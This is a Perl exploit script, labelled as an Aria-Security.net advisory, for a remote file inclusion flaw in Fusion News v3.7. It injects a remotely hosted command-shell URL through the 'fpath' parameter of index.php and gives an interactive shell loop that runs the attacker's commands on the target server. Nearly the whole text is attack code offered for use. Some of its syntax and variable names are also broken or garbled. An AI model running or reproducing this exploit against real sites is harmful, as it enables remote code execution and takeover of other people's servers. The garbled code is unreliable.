#!/usr/bin/perl

	###########################################################################################

	#			Aria-Security.net Advisory                                   															     #

	#			Discovered  by: OUTLAW                                    														               #

	#			&lt; www.Aria-security.net &gt;                               														              #

	#		Gr33t to: A.u.r.a  &amp; HessamX &amp; Cl0wn &amp; DrtRp													                       	  #

	#		  Special Thanx To All Aria-Security Users      			  													 #

	###########################################################################################


use LWP::UserAgent;

print &quot;\n === Fusion News v3.7 Remote File Inclusion\n&quot;;

print &quot;\n === Discovered by OutLaw .\n&quot;;

print &quot;\n  === www.Aria-Security.Net\n&quot;;


$bPath = $ARGV[0];

$cmdo = $ARGV[1];

$bcmd = $ARGV[2];


if($bPath!~/http:\/\// || $cmdo!~/http:\/\// || !$bcmd){usage()}




while()

 

       print &quot;[Shell] \$&quot;;

while(&lt;STDIN&gt;)

       {

               $cmd=$_;

               chomp($cmd);


$xpl = LWP::UserAgent-&gt;new() or die;

$req = HTTP::Request-&gt;new(GET =&gt;$bpath.&#039;index.php?fpath=&#039;.$cmdo.&#039;?&amp;&#039;.$bcmd.&#039;=&#039;.$cmd)or die &quot;
\n Could not connect !\n&quot;;

$res = $xpl-&gt;request($req);

$return = $res-&gt;content;

$return =~ tr/[\n]/[ê;

if (!$cmd) {print &quot;\nPlease type a Command\n\n&quot;; $return =&quot;&quot;;}

elsif ($return =~/failed to open stream: HTTP request failed!/)

       {print &quot;\n Could Not Connect to cmd Host\n&quot;;exit}

elsif ($return =~/^&lt;b&gt;Fatal.error/) {print &quot;\n Invalid Command\n&quot;}

if($return =~ /(.*)/)

 

       $freturn = $1;

       $freturn=~ tr/[ê[\n]/;

       print &quot;\r\n$freturn\n\r&quot;;

       last;

 


else {print &quot;[Shell] \$&quot;;}}}last;


sub usage()

 {

print &quot; Usage : fusion.pl [host] [cmd shell location] [cmd shell variable]\n&quot;;

print &quot; Example : fusion.pl http://fusionnews.com http://www.shell.com/cmd.txt cmd\n&quot;;

 exit();

 }
